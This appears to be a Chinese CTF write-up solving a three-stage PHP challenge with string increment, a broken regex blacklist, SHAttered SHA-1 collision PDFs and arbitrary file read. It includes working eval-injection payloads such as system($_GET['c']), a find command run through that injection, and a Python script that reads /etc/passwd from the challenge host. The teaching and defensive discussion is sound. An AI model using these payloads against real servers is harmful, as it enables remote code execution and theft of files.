---
title: "[NSSRound#30 Duo] 小桃的 PHP 挑战：字符串自增、坏掉的正则、SHA-1 碰撞与任意文件读取"
date: 2026-11-23 17:00:00
updated: 2026-11-23 17:00:00
categories:
  - CTF
  - Web
  - PHP 安全
tags:
  - PHP
  - 源码审计
  - 字符串自增
  - preg_match
  - 正则绕过
  - eval
  - SHA-1 碰撞
  - SHAttered
  - 任意文件读取
  - requests
  - multipart
  - NSSCTF
description: 三关串成一条链：第一关用 '9'++ 得到 "10" 骗过长度判断；第二关的黑名单正则里有个裸的 ?，PCRE 直接编译失败，preg_match 返回 false，!preg_match 恒真，于是用 // 注释掉 echo $two;die(); 就能设 B=1；第三关 (string) 封死数组绕过，只能用 SHAttered 的真实 SHA-1 碰撞 PDF。最后 file_get_contents($_POST['file']) 读任意文件。
difficulty: 入门
topic: PHP 安全
series: PHP 安全
series_order: 2
permalink: 2026/11/23/web-ctf-nssround30-xiaotao-php/
---

{% note primary %}
**一分钟速览**

- **难度**：入门偏进阶（PHP 语法点比较密，但每一步都不复杂）
- **考点**：PHP 字符串自增、`preg_match` 非法正则、`!preg_match` 返回值陷阱、`eval` 拼接、注释绕过、SHA-1 碰撞、multipart 二进制表单、任意文件读取
- **三关目标**：让 `$A`、`$B`、`$C` 都等于 1，最后 `file_get_contents($_POST['file'])` 读文件
- **第一关**：`str=9` → `'9'++` 得到 `10`，`strlen('10') > 1`
- **第二关**：正则里有个裸的 `?`，PCRE 编译失败 → `preg_match` 返回 `false` → 条件恒真；`comment=//` 注释掉 `echo $two;die();`
- **第三关**：`(string)` 堵死数组绕过，`===` 堵死 `0e` 魔法哈希，只能用 SHAttered 的两个碰撞 PDF
- **关键坑**：两个 PDF 要用 `multipart/form-data` 原始字节发送，URL 编码会撑爆 nginx 的 1MB 限制
- **flag**：`NSSCTF{47613c27-af5a-4e93-a827-c7ccc7eb4d9c}`
- **思考题**：文中有 9 道，答案默认折叠，建议先自己想一遍
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：PHP 基本语法、HTTP 的 GET/POST、`sha1` 是什么。没做过 PHP 题也能看，正文会逐段解释。
- **工具**：浏览器、`curl`、Python + `requests`、`sha1sum`
- **环境**：文中的靶场地址是当时的临时环境，现在多半已经失效，请换成自己的靶场或本地环境
- **碰撞文件**：SHAttered 官方地址是 `shattered.io`（不是 `shattered.it`，后者现在会跳转）。两个 PDF 各 422,435 字节，SHA-1 都是 `38762cf7f55934b34d179ae6a4c80cadccbb7f0a`
- 本文所有操作仅用于**授权靶场和本地环境**，请勿对未授权的目标做任何测试
{% endnote %}

{% note default %}
**做题路线**

`读源码` → `第一关：字符串自增` → `第二关：发现正则编译失败` → `用 // 注释掉 die()` → `第三关：分析 (string) 和 ===` → `下载 SHAttered PDF` → `用 multipart 发二进制` → `读 /etc/passwd 验证` → `RCE find 找 flag` → `file_get_contents 读 flag`
{% endnote %}

## 先看源码

打开页面，直接就是源码——`highlight_file(__FILE__)` 把自己的文件高亮输出了：

```php
<?php
include 'jeer.php';
highlight_file(__FILE__);
error_reporting(0);
$A = 0;
$B = 0;
$C = 0;

//第一关
if (isset($_GET['one'])){
    $str = $_GET['str'] ?? '0';
    $add = substr($str, 0, 1); 
    $add++;
    if (strlen($add) > 1 ) {
        $A = 1;
    } else {
        echo $one;
    }
} else {
    echo $begin;
}

//第二关
if (isset($_GET['two'])){
    $comment = $_GET['comment'] ?? 'echo(114514)';
    if (!preg_match('/(|;| |\$|~|\#|`|\'|\"|\*|?|<|>|\r|\n|\^)/i', $comment) && strlen($comment) < 20) {
        try{
            eval('$B = 1;'.$comment.';echo $two;die();');
        }catch (Error $e){
            echo $boom;
        }
    }
}

//第三关
if (isset($_GET['three'])){
    if (isset($_POST['one'])&&isset($_POST['two'])){
        $a1=(string)$_POST['one'];
        $a2=(string)$_POST['two'];
        if ($a1 !== $a2 && sha1($a1) === sha1($a2)){
            $C = 1;
        } else {
            echo $three;
        }
    }
}

if ($A == 1 && $B == 1 && $C == 1){
    echo file_get_contents($_POST['file']);
}
?>
```

先把整体结构看清楚：

- 三个 `if` 分别对应三关，每关通过就把 `$A`、`$B`、`$C` 设成 1；
- 三个变量在**每个请求开头**都被重置为 0，所以要一次请求里同时过三关；
- 最后 `if ($A == 1 && $B == 1 && $C == 1)` 成立时，执行 `file_get_contents($_POST['file'])`，读任意文件；
- `include 'jeer.php'` 里的 `$begin`、`$one`、`$two`、`$three`、`$boom` 是各种嘲讽文案，失败时打印出来；
- `error_reporting(0)` 把所有警告藏起来了——这一点在第二关非常关键。

顺便说一句：这题不是某个具体 CVE 的复现，而是几处逻辑漏洞叠在一起——字符串自增、正则编译失败、`eval` 拼接、类型转换和任意文件读取。

{% note warning %}
**三关必须在同一个请求里完成。** `$A`、`$B`、`$C` 是普通局部变量，不是 session，也不是 cookie。你分三次请求，每次开头都会被重置成 0，最后一关永远过不了。

所以最终请求要同时带上 `one`、`two`、`three` 三个 GET 参数，以及第三关需要的 POST 数据。
{% endnote %}

## 第一关：让一个字符变成两个字符

```php
if (isset($_GET['one'])){
    $str = $_GET['str'] ?? '0';
    $add = substr($str, 0, 1); 
    $add++;
    if (strlen($add) > 1 ) {
        $A = 1;
    } else {
        echo $one;
    }
} else {
    echo $begin;
}
```

逐行看：

- `isset($_GET['one'])`：只要 URL 里有 `one` 这个参数就行，值是什么无所谓；
- `$_GET['str'] ?? '0'`：`??` 是 null 合并运算符，`str` 没传就默认 `'0'`；
- `substr($str, 0, 1)`：从第 0 个位置取 1 个字符，**只取第一个字符**；
- `$add++`：对这个字符做自增；
- `strlen($add) > 1`：自增之后长度要大于 1。

### PHP 的字符串自增

PHP 的 `++` 对字符串有两条规则：

| 情况 | 行为 | 例子 |
| --- | --- | --- |
| 数字字符串 | 按数值 +1，结果是 int/float | `'9'++` → `10` |
| 非数字字符串 | Perl 风格的“字符串进位” | `'a'++` → `'b'`，`'z'++` → `'aa'` |

所以想让长度从 1 变成 2：

- `str=9`：`substr` 得到 `'9'`，自增得到 `10`，`strlen('10') == 2`，过关；
- `str=z`：自增得到 `'aa'`，长度 2，也能过；
- `str=a`：自增得到 `'b'`，长度还是 1，不过。

用 `9` 最干净：

```text
http://<靶场地址>/?one=1&str=9
```

页面没有额外回显，就说明 `$A = 1` 了：

![第一关](01-level1.png)

*图 1：`?one=1&str=9`，页面只剩源码，没有失败提示，说明第一关过了*

如果把 `str` 写成 `a`，就会走 `else`，`echo $one` 把第一关的嘲讽打出来——也就是告诉你看源码。

{% note think **思考 01｜为什么 `str=9` 能过，`str=a` 不行？** %}
关键在 `substr($str, 0, 1)` 只取第一个字符：

- `str=9` → `$add = '9'` → `'9'++` 是数字自增，得到 `10`（int）→ `strlen(10)` 会把 int 转成字符串 `"10"`，长度 2 → 过关；
- `str=a` → `$add = 'a'` → 非数字字符串自增，`'a'++` 得到 `'b'`，长度 1 → 不过；
- `str=z` → `'z'++` 得到 `'aa'`，长度 2 → 也能过。

所以第一关考的不是“怎么让字符串变长”，而是**PHP 的 `++` 对数字字符串和非数字字符串有两套规则**。
{% endnote %}

{% note think **思考 02｜除了 `9`，还有哪些值能过？`str=10` 行不行？** %}
`str=10` 不行：`substr('10', 0, 1)` 取的是第一个字符 `'1'`，`'1'++` 得到 `2`，长度 1，还是不过。

能过的是“第一个字符自增后会变成两位”的值：

| `str` 的第一个字符 | 自增结果 | 长度 | 过不过 |
| --- | --- | --- | --- |
| `9` | `10` | 2 | ✅ |
| `z` | `aa` | 2 | ✅ |
| `Z` | `AA` | 2 | ✅ |
| `a` | `b` | 1 | ❌ |
| `0` | `1` | 1 | ❌ |
| `1` | `2` | 1 | ❌ |

所以 `str=9`、`str=z`、`str=Z` 都行，`str=99` 也行（只取第一个 `9`）。
{% endnote %}

## 第二关：一个坏掉的正则

```php
if (isset($_GET['two'])){
    $comment = $_GET['comment'] ?? 'echo(114514)';
    if (!preg_match('/(|;| |\$|~|\#|`|\'|\"|\*|?|<|>|\r|\n|\^)/i', $comment) && strlen($comment) < 20) {
        try{
            eval('$B = 1;'.$comment.';echo $two;die();');
        }catch (Error $e){
            echo $boom;
        }
    }
}
```

这段是整道题最精彩的部分。

- `$comment = $_GET['comment'] ?? 'echo(114514)'`：没传 `comment` 就默认执行 `echo(114514)`；
- 黑名单正则：分号、空格、`$`、`~`、`#`、反引号、单双引号、`*`、`?`、`<`、`>`、回车、换行、`^` 都被禁；
- `&& strlen($comment) < 20`：comment 还不能超过 19 个字符；
- 过了检查就 `eval('$B = 1;' . $comment . ';echo $two;die();')`。

### 把正则拆开看

```text
/(|;| |\$|~|\#|`|\'|\"|\*|?|<|>|\r|\n|\^)/i
```

`/i` 是忽略大小写。括号里是一堆用 `|` 分开的“或”：

```text
(空) | ; | 空格 | \$ | ~ | \# | ` | ' | " | \* | ? | < | > | \r | \n | \^
```

注意两个地方：

1. **第一个分支是空的**：`(|;|...` 一上来就是一个 `|`，所以第一个“或”分支什么都没有。空分支在正则里可以匹配任何位置，如果这个模式能编译，`preg_match` 会对任何字符串返回 1。
2. **`\*` 后面有一个裸的 `?`**：`|\*|?|<|>`。这里的 `?` 本来想表示“0 次或 1 次”，但它前面没有任何可以重复的东西——上一个分支在 `|` 处已经结束了。

裸的 `?` 是**非法量词**，PCRE 直接编译失败：

```text
preg_match(): Compilation failed: quantifier does not follow a repeatable item at offset 24
```

而 `preg_match` 在**编译失败时返回 `false`**，不是 0，也不是 1。

### `!preg_match` 的真实结果

```php
if (!preg_match($pattern, $comment) && strlen($comment) < 20)
```

- 正则编译失败 → `preg_match` 返回 `false`；
- `!false` → `true`；
- 只要 `strlen($comment) < 20`，条件就成立。

也就是说，**这个黑名单从一开始就没生效过**。你写什么它都不管，只要长度别超过 19。

`error_reporting(0)` 把编译失败的警告也藏了，页面上看不到任何异常。

{% note think **思考 03｜为什么 `preg_match` 返回的是 `false`，而不是“匹配成功返回 1”？** %}
因为模式本身就没编译成功。

PCRE 先编译正则，再拿它去匹配。`|\*|?|` 里的裸 `?` 是一个量词，但前面没有可重复的项（上一个分支在 `|` 处结束了），所以编译阶段就报错：

```text
quantifier does not follow a repeatable item
```

`preg_match` 遇到编译错误时返回 `false`（布尔值），而不是整数 1/0。`error_reporting(0)` 只是把警告藏了，返回值还是 `false`。

于是 `!preg_match(...)` 变成 `!false`，也就是 `true`。**一个本该“拦截”的判断，反而变成了“放行”。**
{% endnote %}

{% note think **思考 04｜如果正则没有那个裸 `?`，你能绕过吗？** %}
要看还有没有那个空分支。

- 如果只删掉裸 `?`、保留空分支 `(|;|...)`：空分支能匹配任何位置，`preg_match` 返回 1，`!preg_match` 是 `false`，条件永远不成立——第二关直接无解。
- 如果空分支和裸 `?` 都删掉：`//` 只包含 `/`，不在黑名单里，长度 2，仍然能过。这时黑名单本身其实也拦不住注释。

所以这题是“两个 bug 叠在一起”：空分支会让黑名单变成“全拦”，而裸 `?` 让正则编译失败，反而变成“全放”。真正起作用的是**编译失败**。
{% endnote %}

### eval 和注释：把 `die()` 关掉

真正执行的是这一句：

```php
eval('$B = 1;' . $comment . ';echo $two;die();');
```

注意它的结构：**`$B = 1;` 已经写在前面了**。这是出题人送的礼物——你不需要自己执行命令来设 `B`，只要让后面的代码别捣乱就行。

后面的代码是：

```php
;echo $two;die();
```

- `echo $two;`：从回显看，`$two` 来自 `jeer.php`，应该就是那句嘲讽；
- `die();`：直接结束脚本，后面的第三关和最终读文件都不会执行。

所以如果直接传 `comment=//`，拼接出来就是：

```php
$B = 1;//;echo $two;die();
```

`//` 把后面的 `;echo $two;die();` 全注释掉了。效果是：

- `$B = 1` 正常执行；
- 嘲讽不打印；
- `die()` 不执行；
- 脚本继续往下走，进入第三关。

页面看起来就是“源码 + 什么都没有”，说明第二关过了：

![comment=//](02-comment.png)

*图 2：`comment=//` 后，`echo $two;die();` 被注释，页面只剩源码*

而不注释时，`$two` 会把嘲讽打出来。这句嘲讽其实就是在提示你：

![嘲讽](03-taunt.png)

*图 3：“第二关我都把1给你了，注释都不会吗？笨蛋”——`$two` 就是 `jeer.php` 里定义的这句话*

### 另一条路：直接 RCE

第二关还有一个更直接的效果：既然正则失效了，`$comment` 里的内容会原样进入 `eval`。那我们完全可以执行命令：

```text
?one=1&str=9&two=2&comment=system('ls /')
```

`system('ls /')` 是 14 个字符，小于 20，能过。页面会把根目录列出来：

![system 执行](04-rce-ls.png)

*图 4：`system('ls /')` 真的执行了，根目录列表被打出来，后面跟着 `echo $two` 的嘲讽*

但要注意：`system(...)` 执行完，后面还有 `echo $two;die();`，`die()` 会终止脚本，所以这样只能做侦察，没法继续走到第三关和最终读文件。

如果命令比较长，`comment` 放不下，就套一层 GET：

```text
?two=1&comment=system($_GET['c'])&c=<你的命令>
```

`system($_GET['c'])` 是 18 个字符，小于 20；真正的命令放在 `c` 里，不受长度限制。这是后面找 flag 路径用的方法。

实际发请求时，空格、单引号、`$`、`[`、`]` 这些字符要做 URL 编码；用 `requests` 的 `params` 字典最省事，它会自动编码。

{% note think **思考 05｜为什么要把命令塞进 `$_GET['c']`？直接写 `system('find ...')` 不行吗？** %}
因为 `strlen($comment) < 20` 限制的是**整个 comment 字符串**的长度。`system('find / -name ...')` 早就超过 19 个字符了。

`system($_GET['c'])` 只有 18 个字符：

```text
s y s t e m ( $ _ G E T [ ' c ' ] )
1 2 3 4 5 6 7 8 9 ...
```

它本身很短，真正的命令通过 `c` 参数传进去。**外层只检查外壳的长度，不检查外面参数的长度**，这就是绕过思路。

同理，`system('cat /flag')` 是 19 个字符，刚好能过；但更长的路径就得用这种“参数套娃”。
{% endnote %}

## 第三关：真实的 SHA-1 碰撞

```php
if (isset($_GET['three'])){
    if (isset($_POST['one'])&&isset($_POST['two'])){
        $a1=(string)$_POST['one'];
        $a2=(string)$_POST['two'];
        if ($a1 !== $a2 && sha1($a1) === sha1($a2)){
            $C = 1;
        } else {
            echo $three;
        }
    }
}
```

要求很明确：

1. `$a1 !== $a2`：两个值不能相同；
2. `sha1($a1) === sha1($a2)`：两个值的 SHA-1 必须相同。

### 为什么数组绕过不行

PHP 里有个经典技巧（老版本）：`sha1()` 传数组会返回 `null`，于是 `sha1([]) === sha1([])` 是 `null === null`，成立；同时两个数组本身不相等，`!==` 也成立。

但这题加了 `(string)` 强制转换：

```php
$a1 = (string)$_POST['one'];
$a2 = (string)$_POST['two'];
```

PHP 把数组转成字符串会得到 `"Array"`（还会报个 warning，但 `error_reporting(0)` 吞了）。于是：

- `$_POST['one'] = [1]` → `$a1 = "Array"`
- `$_POST['two'] = [2]` → `$a2 = "Array"`
- `$a1 !== $a2` → `"Array" !== "Array"` → `false` → 直接不过。

数组绕过被堵死了。

### 为什么 `0e` 魔法哈希不行

另一个经典技巧是“魔法哈希”：某些字符串的 SHA-1 看起来像 `0e123...`，在 PHP 的**松散比较** `==` 下会被当成科学计数法的 0，于是两个不同的 `0e...` 哈希会相等。

但这题用的是 `===`：

```php
sha1($a1) === sha1($a2)
```

`===` 比较的是字符串本身，`"0e123" === "0e456"` 是 `false`。魔法哈希只对 `==` 有效，这里不成立。

### 只能上真实碰撞：SHAttered

既然要两个**不同**的字符串、SHA-1 **完全相同**，那就得用一个真正的 SHA-1 碰撞。

2017 年，Google 和 CWI 的研究者公开了 **SHAttered**：两个内容不同、但 SHA-1 完全相同的 PDF 文件。

本地核对过的事实：

```text
文件大小：422,435 字节（两个一样）
SHA-1   ：38762cf7f55934b34d179ae6a4c80cadccbb7f0a（两个一样）
差异字节：62 个（文件内容确实不同）
```

下载（官方站点是 `shattered.io`）：

```bash
curl -sSO https://shattered.io/static/shattered-1.pdf
curl -sSO https://shattered.io/static/shattered-2.pdf
sha1sum shattered-1.pdf shattered-2.pdf
```

两个文件大小一样、哈希一样，但 `cmp -l` 能看到 62 个字节不同。正好满足：

- `$a1 !== $a2`（内容不同）；
- `sha1($a1) === sha1($a2)`（哈希相同）。

把这两个 PDF 的**原始字节**分别放进 POST 的 `one` 和 `two` 字段，第三关就过了。

{% note think **思考 06｜为什么 `sha1([]) === sha1([])` 这个老套路在这题不灵？** %}
因为 `(string)` 强制转换发生在 `sha1` 之前：

```php
$a1 = (string)$_POST['one'];   // 数组 → "Array"
```

不管传什么数组，转成字符串都是 `"Array"`，两个值就相等了，`$a1 !== $a2` 直接不成立。

这题的设计就是：先把“值”转成字符串，再用严格比较。数组绕过、类型混淆都被提前拍平了。
{% endnote %}

{% note think **思考 07｜`0e` 魔法哈希为什么也不行？** %}
`0e` 魔法哈希依赖 PHP 的 `==`：当两个字符串都形如 `0e` 加数字时，`==` 会把它们当成科学计数法的 0，从而相等。

但这里是 `===`：

```php
sha1($a1) === sha1($a2)
```

`===` 比较的是字符串本身，不做数值转换。两个不同的 `0e...` 哈希永远不会 `===`。

所以只剩“真碰撞”一条路。
{% endnote %}

## 把三关串起来

### 一个请求里过三关

因为 `$A`、`$B`、`$C` 每个请求都会重置，最终请求必须同时包含：

- GET：`one=1`、`two=2`、`three=3`、`str=9`、`comment=//`
- POST：`one=<pdf1 原始字节>`、`two=<pdf2 原始字节>`、`file=<要读的文件>`

对应的完整 URL 大致是：

```text
http://<靶场地址>/?one=1&two=2&three=3&str=9&comment=//
```

POST 部分用 Python 构造。

### 为什么用 `files=` 而不是 `data=`

第三关要把两个 PDF 的**原始字节**发过去。有两条路：

| 方式 | Content-Type | 二进制怎么处理 | 大小 |
| --- | --- | --- | --- |
| `data=` | `application/x-www-form-urlencoded` | 每个非 ASCII 字节变成 `%XX`，约 3 倍 | 可能超过 1MB |
| `files=` | `multipart/form-data` | 原始字节直接放 body | 基本不变 |

两个 PDF 各 422,435 字节，加起来 844,870 字节，离 nginx 默认的 `client_max_body_size 1m`（1,048,576 字节）还有约 200KB 余量。

但如果用 `data=` 做 URL 编码，二进制字节会膨胀到两三倍，直接超过 1MB，nginx 返回 **413 Request Entity Too Large**。所以必须用 multipart，并且不要再手动 URL 编码。

还有一个细节：`requests` 的 `files=` 里，元组 `(filename, value)` 表示**文件上传**；`(None, value)` 才表示**普通表单字段**。

```python
files = {
    "one":  (None, pdf1),   # 普通字段，进 $_POST['one']
    "two":  (None, pdf2),   # 普通字段，进 $_POST['two']
    "file": (None, "/etc/passwd"),
}
```

如果写成 `("a.pdf", pdf1)`，PHP 会把它放进 `$_FILES`，`$_POST['one']` 就是空的，第三关直接不过。

{% note think **思考 08｜为什么 `files=` 里要用 `(None, value)`？不用会怎样？** %}
`requests` 用元组的第一个元素判断这是不是文件上传：

- `(None, value)`：没有文件名 → 当作普通表单字段 → PHP 放进 `$_POST`；
- `("name", value)`：有文件名 → 当作文件上传 → PHP 放进 `$_FILES`。

第三关读的是 `$_POST['one']` 和 `$_POST['two']`，所以必须用 `(None, value)`。

这个参数名叫 `files`，很容易让人以为只能传文件，其实它也能传普通字段——这正是这题能塞进两个 400KB 二进制值的关键。
{% endnote %}

### 先读 `/etc/passwd` 验证

写个脚本，先确认第三关过了：

```python
import requests

url = "http://node6.anna.nssnode.cn:24924"

params = {"one": 1, "two": 2, "three": 3, "str": 9, "comment": "//"}

pdf1 = open("shattered-1.pdf", "rb").read()
pdf2 = open("shattered-2.pdf", "rb").read()

files = {
    "one":  (None, pdf1),
    "two":  (None, pdf2),
    "file": (None, "/etc/passwd"),   # 先用它验证三关都过了
}

r = requests.post(url, params=params, files=files, timeout=60)
print(r.status_code, len(r.content))
print(r.content.decode("utf-8", "replace"))
```

如果输出里出现：

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

说明 A、B、C 都是 1，`file_get_contents` 已经能读任意文件了。

## 找 flag 路径并读取

`/etc/passwd` 能读，但 flag 在哪不知道。回第二关用 RCE 找：

```text
?two=1&comment=system($_GET['c'])&c=find / -iname 'flag*' -type f 2>/dev/null
```

命令拆开看：

| 部分 | 作用 |
| --- | --- |
| `find /` | 从根目录开始找 |
| `-iname 'flag*'` | 文件名匹配 `flag*`，不区分大小写 |
| `-type f` | 只要普通文件，不要目录 |
| `2>/dev/null` | 把权限错误等 stderr 丢掉，页面更干净 |

输出会很长，因为 `/sys` 下面有一堆内核的 `flags` 文件：

![find 结果](05-find.png)

*图 5：大量 `/sys/.../flags` 是噪音，真正的目标是 `/1/1/4/5/1/4/flag`*

在一堆 `/sys/devices/.../flags` 里，最后能看到：

```text
/1/1/4/5/1/4/flag
/flag
/flag.sh
```

真正能读出 flag 的是 `/1/1/4/5/1/4/flag`。把最终脚本里的 `file` 换掉：

```python
files = {
    "one":  (None, pdf1),
    "two":  (None, pdf2),
    "file": (None, "/1/1/4/5/1/4/flag"),   # 真正的 flag
}

r = requests.post(url, params=params, files=files, timeout=60)
print(r.content.decode("utf-8", "replace"))
```

![拿到 flag](06-flag.png)

*图 6：最终响应里出现 `NSSCTF{...}`*

```text
NSSCTF{47613c27-af5a-4e93-a827-c7ccc7eb4d9c}
```

{% note think **思考 09｜第二关已经有 RCE 了，为什么还要费劲过第三关？** %}
严格说，第二关的 `system($_GET['c'])` 已经能在服务器上执行命令了。理论上：

```text
?two=1&comment=system($_GET['c'])&c=cat /1/1/4/5/1/4/flag
```

也能直接读 flag。这篇之所以走完整链路，有两个原因：

1. **完整链路是出题人设计的路线**：三关 + 最终 `file_get_contents`，每一关考一个知识点；
2. **RCE 路线有副作用**：`system(...)` 后面还有 `echo $two;die();`，`die()` 会终止脚本，所以它适合侦察，不适合接着过第三关。

不过从攻击者视角看，RCE 确实是最短路径。**“最短路径”和“出题人想要的路径”不总是一条**，做 CTF 时两条都值得知道。
{% endnote %}

## 知识点补充

### 1. PHP 字符串自增

| 输入 | `++` 之后 | 长度 | 说明 |
| --- | --- | --- | --- |
| `'9'` | `10`（int） | 2 | 数字字符串按数值加 |
| `'z'` | `'aa'` | 2 | 非数字字符串按字母进位 |
| `'Z'` | `'AA'` | 2 | 同上，保留大小写风格 |
| `'Az'` | `'Ba'` | 2 | 字母进位 |
| `'a'` | `'b'` | 1 | 只进一位 |
| `'0'` | `1`（int） | 1 | 数字加 1 |
| `'99'` | `100`（int） | 3 | 数字整体加 1 |

注意 `substr($str, 0, 1)` 只取第一个字符，所以 `str=99` 等价于 `str=9`。

表格是 `++` 本身的行为；本题先 `substr` 取第一个字符，所以 `str=Az` 实际是 `'A'++` → `'B'`，长度 1，过不了。别把多字符进位的例子直接套到 `str` 参数上。

PHP 8.3 之后，对非数字字符串做 `++` 会报 deprecated，官方建议用 `str_increment()`。但这题的环境是旧 PHP，`'z'++` 照样能用；用 `'9'` 则连 deprecated 都不会触发。

### 2. `preg_match` 的返回值陷阱

`preg_match` 有**三种**返回值：

| 返回值 | 含义 |
| --- | --- |
| `1` | 匹配到了 |
| `0` | 没匹配到 |
| `false` | 发生错误（包括正则编译失败） |

`if (!preg_match(...))` 这种写法把 `false` 和 `0` 混为一谈：**正则写错时，它不会报错拦截，反而当成“没匹配”放行。**

正确的写法应该是：

```php
$r = preg_match($pattern, $input);
if ($r === false) {
    // 正则本身有问题，应该报错/拒绝
} elseif ($r === 0) {
    // 没匹配
} else {
    // 匹配到了
}
```

这题就是典型的“错误被当成通过”。

另外，即使正则能编译，`(|;|...)` 的空分支也会匹配任何字符串，黑名单依然失效。**黑名单本身就是脆弱的**：漏一个字符就前功尽弃，何况还能用注释、编码、换行等方式绕。

### 3. `eval` 拼接与注释

```php
eval('$B = 1;' . $comment . ';echo $two;die();');
```

这相当于把用户输入直接拼进代码。危险点不只是“能执行命令”，还有“能改控制流”：

- `//`、`#`、`/* */` 可以把后面的代码注释掉；
- `;` 可以插入新语句；
- `die()` / `exit()` 可以提前结束脚本。

这题的 `$B = 1;` 已经写死在前面，所以最简单的过关方式不是执行命令，而是**注释掉后面的 `echo $two;die();`**。页面上的嘲讽“第二关我都把1给你了，注释都不会吗？笨蛋”，说的就是这件事。

防御方式：

- 不要 `eval` 用户输入；
- 必须做动态执行时，用白名单、AST 解析或模板引擎，不要用正则黑名单；
- 如果一定要拼接，至少把用户输入放在数据位置，而不是代码位置。

### 4. SHA-1 碰撞与 SHAttered

哈希函数的三种“难”：

| 性质 | 含义 |
| --- | --- |
| 原像抵抗 | 给定哈希，找不到原消息 |
| 第二原像抵抗 | 给定消息，找不到另一条同哈希消息 |
| 碰撞抵抗 | 找任意两条不同但同哈希的消息 |

SHA-1 的碰撞抵抗在 2017 年被 SHAttered 攻破：研究者构造了两个不同的 PDF，SHA-1 完全相同。计算量大约是 6,500 年单 CPU 或 110 年单 GPU。

所以在 PHP 里：

```php
$a1 !== $a2 && sha1($a1) === sha1($a2)
```

只要用这两个 PDF 的原始内容，就能同时满足。

现实中的防御：

- 不要用 SHA-1 / MD5 做安全相关的完整性校验；
- 用 SHA-256 或更强的算法；
- 比较哈希时用 `hash_equals()`，避免时序攻击。

注意：这题不是“破解 SHA-1”，而是**直接使用公开的碰撞样本**。攻击者不需要自己算，下载现成的就行。

### 5. PHP 类型转换与常见哈希绕过

| 手法 | 依赖 | 这题为什么不行 |
| --- | --- | --- |
| 数组绕过 `sha1([]) === sha1([])` | `sha1(array)` 返回 `null`（老版本） | `(string)` 把数组转成 `"Array"`，两个值相等 |
| 魔法哈希 `0e...` | 松散比较 `==` | 这里用 `===`，比较字符串本身 |
| 类型混淆 `"0" == "0e..."` | `==` 的数值转换 | 同上，`===` 不做转换 |
| 真实碰撞 | SHA-1 碰撞样本 | ✅ 唯一可行 |

这也说明：**`==` 和 `===` 的差别不只是“严不严谨”，它直接决定哪些绕过手法能用。**

### 6. multipart/form-data 与二进制表单

`application/x-www-form-urlencoded` 和 `multipart/form-data` 的区别：

| 项目 | urlencoded | multipart |
| --- | --- | --- |
| 二进制数据 | 需要 `%XX` 编码，体积膨胀 | 原始字节直接放 body |
| 文件上传 | 不支持 | 支持 |
| 普通字段 | 支持 | 支持（`filename` 为空） |
| 适合场景 | 短文本 | 文件、大二进制 |

`requests` 的用法：

```python
# urlencoded，二进制会被 URL 编码
requests.post(url, data={"one": pdf1})

# multipart，二进制保持原样
requests.post(url, files={"one": (None, pdf1)})
```

nginx 的 `client_max_body_size` 默认是 `1m`，两个 422,435 字节的 PDF 加起来 844,870 字节，刚好在限制内；一旦做 URL 编码就会超。

### 7. `find` 找文件

```bash
find / -iname 'flag*' -type f 2>/dev/null
```

| 参数 | 作用 |
| --- | --- |
| `/` | 从根目录开始 |
| `-iname` | 按文件名匹配，忽略大小写 |
| `'flag*'` | 以 flag 开头 |
| `-type f` | 只找普通文件 |
| `2>/dev/null` | 丢弃错误输出 |

常见噪音：

- `/sys/devices/.../flags`：内核 sysfs 的属性文件，名字里带 flags；
- `/proc/...`：进程信息，可能也有同名文件；
- 权限错误：`find` 会打印一堆 `Permission denied`，用 `2>/dev/null` 丢掉。

真正的 flag 往往藏在很深的目录里，比如这题的 `/1/1/4/5/1/4/flag`。

### 8. 任意文件读取与防御

最后的 `file_get_contents($_POST['file'])` 是一个典型的任意文件读取：路径完全由用户控制，没有任何白名单或路径限制。

防御思路：

| 问题 | 防御 |
| --- | --- |
| 任意路径 | 白名单 + `realpath` 校验，限制在指定目录内 |
| 敏感文件 | 不要把 flag、配置放在 Web 可读路径 |
| 布尔门控 | 不要用“用户可控的 A/B/C 标志”来决定是否读文件 |
| 信息泄露 | 关闭错误回显，但不要依赖它做安全 |
| 代码执行 | 不要 `eval` 拼接输入，不要用坏正则当黑名单 |

## 几个容易踩的坑

| # | 坑 | 现象 | 正确做法 |
| --- | --- | --- | --- |
| 1 | `str=10` | 取第一个字符 `'1'`，自增成 `2`，长度 1 | 用 `str=9` 或 `str=z` |
| 2 | 分三次请求过三关 | `$A/$B/$C` 每次重置，永远凑不齐 | 一次请求带齐三个 GET |
| 3 | `comment` 没注释 `die()` | 脚本在第二关就结束 | `comment=//` |
| 4 | 以为正则真的在拦截 | 其实 `preg_match` 返回 `false` | 记住“编译失败 = false = 放行” |
| 5 | 用数组过第三关 | `(string)` 把数组转成 `"Array"` | 用真实 SHA-1 碰撞 |
| 6 | 用 `0e` 魔法哈希 | `===` 不比较数值 | 同上 |
| 7 | 用 `data=` 发 PDF | URL 编码膨胀，413 | 用 `files=` + `(None, bytes)` |
| 8 | 用 `("a.pdf", pdf1)` | 进了 `$_FILES`，`$_POST` 为空 | 用 `(None, pdf1)` |
| 9 | 读 `/flag` | 可能是干扰项或读不到 | 用 `find` 找到真实路径再读 |
| 10 | 在 PHP 8.3+ 用 `str=z` | 触发 deprecated 警告 | 用 `str=9` 最稳 |

## 完整流程速查

| 步骤 | 目的 | 操作 | 结果 |
| --- | --- | --- | --- |
| 1 | 读源码 | 打开首页 | `highlight_file` 直接给源码 |
| 2 | 过第一关 | `?one=1&str=9` | `'9'++` → `10`，`$A=1` |
| 3 | 过第二关 | `comment=//` | 注释掉 `echo $two;die();`，`$B=1` |
| 4 | 侦察 | `comment=system($_GET['c'])&c=ls /` | 命令执行 |
| 5 | 准备碰撞 | 下载 `shattered-1/2.pdf` | 两个同 SHA-1 的文件 |
| 6 | 过第三关 | POST `one`/`two` 原始字节 | `$C=1` |
| 7 | 验证读文件 | `file=/etc/passwd` | 读到 `root:x:0:0...` |
| 8 | 找 flag | `c=find / -iname 'flag*' -type f 2>/dev/null` | `/1/1/4/5/1/4/flag` |
| 9 | 读 flag | `file=/1/1/4/5/1/4/flag` | `NSSCTF{...}` |

## 小结

这道题把 PHP 里几个常见但容易记混的点串成了一条链：

- **字符串自增**：数字字符串按数值加，非数字字符串按字母进位；`substr` 只取第一个字符；
- **`preg_match` 的三种返回值**：`1`、`0`、`false`；编译失败返回 `false`，`!preg_match` 反而放行；
